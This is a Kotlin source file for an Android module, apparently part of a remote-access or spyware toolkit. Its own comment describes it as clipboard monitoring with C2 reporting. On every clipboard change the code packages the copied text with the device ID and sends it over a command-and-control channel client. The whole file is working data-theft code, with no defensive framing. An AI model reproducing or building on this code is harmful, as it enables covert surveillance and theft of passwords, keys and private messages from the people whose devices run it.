package com.xrc.sensors

import android.content.Context
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity
import com.xrc.core.toJsonString

/**
 * Clipboard — clipboard monitoring module with C2 reporting.
 */
class Clipboard(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    private val monitor = ClipboardMonitor(context)

    init {
        monitor.onClipChanged = { text ->
            val deviceId = Identity.getDeviceId(context)
            val msg = Message(
                type = Protocol.TYPE_SENSOR_DATA,
                id = "clip_${System.currentTimeMillis()}",
                device_id = deviceId,
                payload = mapOf("type" to "clipboard", "data" to text).toJsonString()
            )
            channelClient.send(msg)
        }
    }

    fun getCurrent(): String? = monitor.getCurrent()
    fun startMonitoring(): Boolean = monitor.startMonitoring()
    fun stopMonitoring() = monitor.stopMonitoring()
    fun set(text: String) = monitor.set(text)
    fun clear() = monitor.clear()
}
